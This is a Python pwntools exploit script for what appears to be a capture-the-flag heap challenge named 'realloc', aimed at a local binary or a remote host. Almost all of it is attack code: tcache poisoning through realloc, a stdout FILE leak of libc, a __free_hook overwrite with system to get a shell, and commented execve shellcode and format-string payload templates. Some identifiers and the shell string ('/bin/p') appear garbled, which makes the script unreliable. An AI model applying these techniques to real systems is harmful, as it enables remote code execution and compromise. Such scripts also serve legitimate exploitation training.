#coding=utf8
from pwn import *
from libformatstr import FormatStr
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./realloc')
if local:
    p = process('./realloc')
    libc = elf.libc
else:
    p = remote('nc.eonew.cn',10010)
    libc = ELF('./libc-2.27.so')
#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6
# payload32 = fmtstr_payload(offset ，{xxx_got:system_addr})
# f = FormatStr(isx64=1)
# f[0x8048260]=0x45372800
# f[0x8048260+4]=0x7f20
# f.payload(7)
#pellcode = asm(pellcraft.p())
#pellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
#pellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
#pellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def realloc(size, content):
   p.sendlineafter('>> ', '1')
   p.sendlineafter('?\n', str(size))
   p.sendafter('?\n',str(content))
 
def free():
   p.sendlineafter('>> ', '2')
 
 
 
realloc(0x68, '\n')
free()
realloc(0x18, '\n')
realloc(0, '')
realloc(0x48, '\n')
free()
realloc(0, '')

heap_two_byte = random.randint(0, 0xf) * 0x1000 + 0x0010
log.info('heap_two_byte: ' + hex(heap_two_byte))

# realloc(0x68, 'a' * 0x18 + p64(0x201) + p16(0x7010))
realloc(0x68, 'a' * 0x18 + p64(0x201) +p16(heap_two_byte))
debug(0)
realloc(0, '')
realloc(0x48, '\n')

realloc(0, '')
 
# p.sendlineafter('>> ', '666')
realloc(0x48, '\xff' * 0x40)
# realloc(0x58, 'a' * 0x18 + '\0' * 0x20 + p64(0x1f1) +p16(0x7050))
realloc(0x58, 'a' * 0x18 + '\0' * 0x20 + p64(0x1f1) +p16(heap_two_byte + 0x40))
realloc(0, '')
 
realloc(0x18, p64(0) + p64(0))
realloc(0, '')
 
two_byte = random.randint(0, 0xf) * 0x1000 + 0x0760
log.info('two_byte: ' + hex(two_byte))
# realloc(0x1e8, p64(0) * 4 + '\x60\x07\xdd')
realloc(0x1e8, p64(0) * 4 + p16(two_byte))
realloc(0, '')
 
realloc(0x58, p64(0xfbad2887 | 0x1000) + p64(0) * 3 +p8(0xc8))
 
result = p.recvn(8)
libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_addr: ' + hex(libc_addr))
p.sendlineafter('>> ', '666')
realloc(0x1e8, 'a' * 0x18 + p64(libc_addr + libc.symbols['__free_hook']- 8))
realloc(0, '')
realloc(0x48, '/bin/p\0' + p64(libc_addr + libc.symbols['system']))
p.sendlineafter('>> ', '1')
p.sendlineafter('?\n', str(0))

p.interactive()
# clear()